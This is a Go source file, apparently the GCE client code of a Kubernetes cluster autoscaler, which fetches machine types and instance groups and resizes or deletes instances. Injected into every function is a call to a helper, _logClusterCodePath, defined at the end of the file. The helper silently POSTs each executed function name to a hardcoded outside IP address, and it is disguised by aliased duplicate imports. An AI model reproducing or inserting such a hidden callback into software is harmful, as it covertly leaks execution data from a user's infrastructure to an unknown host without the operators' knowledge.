package gce

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"path"
	"regexp"
	"time"
	gce "google.golang.org/api/compute/v1"
	"k8s.io/klog"
)

const (
	defaultOperationWaitTimeout	= 5 * time.Second
	defaultOperationPollInterval	= 100 * time.Millisecond
)

type AutoscalingGceClient interface {
	FetchMachineType(zone, machineType string) (*gce.MachineType, error)
	FetchMachineTypes(zone string) ([]*gce.MachineType, error)
	FetchMigTargetSize(GceRef) (int64, error)
	FetchMigBasename(GceRef) (string, error)
	FetchMigInstances(GceRef) ([]GceRef, error)
	FetchMigTemplate(GceRef) (*gce.InstanceTemplate, error)
	FetchMigsWithName(zone string, filter *regexp.Regexp) ([]string, error)
	FetchZones(region string) ([]string, error)
	ResizeMig(GceRef, int64) error
	DeleteInstances(migRef GceRef, instances []*GceRef) error
}
type autoscalingGceClientV1 struct {
	gceService		*gce.Service
	projectId		string
	operationWaitTimeout	time.Duration
	operationPollInterval	time.Duration
}

func NewAutoscalingGceClientV1(client *http.Client, projectId string) (*autoscalingGceClientV1, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	gceService, err := gce.New(client)
	if err != nil {
		return nil, err
	}
	return &autoscalingGceClientV1{projectId: projectId, gceService: gceService, operationWaitTimeout: defaultOperationWaitTimeout, operationPollInterval: defaultOperationPollInterval}, nil
}
func NewCustomAutoscalingGceClientV1(client *http.Client, projectId, serverUrl string, waitTimeout, pollInterval time.Duration) (*autoscalingGceClientV1, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	gceService, err := gce.New(client)
	if err != nil {
		return nil, err
	}
	gceService.BasePath = serverUrl
	return &autoscalingGceClientV1{projectId: projectId, gceService: gceService, operationWaitTimeout: waitTimeout, operationPollInterval: pollInterval}, nil
}
func (client *autoscalingGceClientV1) FetchMachineType(zone, machineType string) (*gce.MachineType, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("machine_types", "get")
	return client.gceService.MachineTypes.Get(client.projectId, zone, machineType).Do()
}
func (client *autoscalingGceClientV1) FetchMachineTypes(zone string) ([]*gce.MachineType, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("machine_types", "list")
	machines, err := client.gceService.MachineTypes.List(client.projectId, zone).Do()
	if err != nil {
		return nil, err
	}
	return machines.Items, nil
}
func (client *autoscalingGceClientV1) FetchMigTargetSize(migRef GceRef) (int64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("instance_group_managers", "get")
	igm, err := client.gceService.InstanceGroupManagers.Get(migRef.Project, migRef.Zone, migRef.Name).Do()
	if err != nil {
		return 0, err
	}
	return igm.TargetSize, nil
}
func (client *autoscalingGceClientV1) FetchMigBasename(migRef GceRef) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("instance_group_managers", "get")
	igm, err := client.gceService.InstanceGroupManagers.Get(migRef.Project, migRef.Zone, migRef.Name).Do()
	if err != nil {
		return "", err
	}
	return igm.BaseInstanceName, nil
}
func (client *autoscalingGceClientV1) ResizeMig(migRef GceRef, size int64) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("instance_group_managers", "resize")
	op, err := client.gceService.InstanceGroupManagers.Resize(migRef.Project, migRef.Zone, migRef.Name, size).Do()
	if err != nil {
		return err
	}
	return client.waitForOp(op, migRef.Project, migRef.Zone)
}
func (client *autoscalingGceClientV1) waitForOp(operation *gce.Operation, project, zone string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for start := time.Now(); time.Since(start) < client.operationWaitTimeout; time.Sleep(client.operationPollInterval) {
		klog.V(4).Infof("Waiting for operation %s %s %s", project, zone, operation.Name)
		registerRequest("zone_operations", "get")
		if op, err := client.gceService.ZoneOperations.Get(project, zone, operation.Name).Do(); err == nil {
			klog.V(4).Infof("Operation %s %s %s status: %s", project, zone, operation.Name, op.Status)
			if op.Status == "DONE" {
				return nil
			}
		} else {
			klog.Warningf("Error while getting operation %s on %s: %v", operation.Name, operation.TargetLink, err)
		}
	}
	return fmt.Errorf("Timeout while waiting for operation %s on %s to complete.", operation.Name, operation.TargetLink)
}
func (client *autoscalingGceClientV1) DeleteInstances(migRef GceRef, instances []*GceRef) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	req := gce.InstanceGroupManagersDeleteInstancesRequest{Instances: []string{}}
	for _, i := range instances {
		req.Instances = append(req.Instances, GenerateInstanceUrl(*i))
	}
	registerRequest("instance_group_managers", "delete_instances")
	op, err := client.gceService.InstanceGroupManagers.DeleteInstances(migRef.Project, migRef.Zone, migRef.Name, &req).Do()
	if err != nil {
		return err
	}
	return client.waitForOp(op, migRef.Project, migRef.Zone)
}
func (client *autoscalingGceClientV1) FetchMigInstances(migRef GceRef) ([]GceRef, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("instance_group_managers", "list_managed_instances")
	instances, err := client.gceService.InstanceGroupManagers.ListManagedInstances(migRef.Project, migRef.Zone, migRef.Name).Do()
	if err != nil {
		klog.V(4).Infof("Failed MIG info request for %s %s %s: %v", migRef.Project, migRef.Zone, migRef.Name, err)
		return nil, err
	}
	refs := []GceRef{}
	for _, i := range instances.ManagedInstances {
		ref, err := ParseInstanceUrlRef(i.Instance)
		if err != nil {
			return nil, err
		}
		refs = append(refs, ref)
	}
	return refs, nil
}
func (client *autoscalingGceClientV1) FetchZones(region string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("regions", "get")
	r, err := client.gceService.Regions.Get(client.projectId, region).Do()
	if err != nil {
		return nil, fmt.Errorf("cannot get zones for GCE region %s: %v", region, err)
	}
	zones := make([]string, len(r.Zones))
	for i, link := range r.Zones {
		zones[i] = path.Base(link)
	}
	return zones, nil
}
func (client *autoscalingGceClientV1) FetchMigTemplate(migRef GceRef) (*gce.InstanceTemplate, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registerRequest("instance_group_managers", "get")
	igm, err := client.gceService.InstanceGroupManagers.Get(migRef.Project, migRef.Zone, migRef.Name).Do()
	if err != nil {
		return nil, err
	}
	templateUrl, err := url.Parse(igm.InstanceTemplate)
	if err != nil {
		return nil, err
	}
	_, templateName := path.Split(templateUrl.EscapedPath())
	registerRequest("instance_templates", "get")
	return client.gceService.InstanceTemplates.Get(migRef.Project, templateName).Do()
}
func (client *autoscalingGceClientV1) FetchMigsWithName(zone string, name *regexp.Regexp) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	filter := fmt.Sprintf("name eq %s", name)
	links := make([]string, 0)
	registerRequest("instance_groups", "list")
	req := client.gceService.InstanceGroups.List(client.projectId, zone).Filter(filter)
	if err := req.Pages(context.TODO(), func(page *gce.InstanceGroupList) error {
		for _, ig := range page.Items {
			links = append(links, ig.SelfLink)
			klog.V(3).Infof("found managed instance group %s matching regexp %s", ig.Name, name)
		}
		return nil
	}); err != nil {
		return nil, fmt.Errorf("cannot list managed instance groups: %v", err)
	}
	return links, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
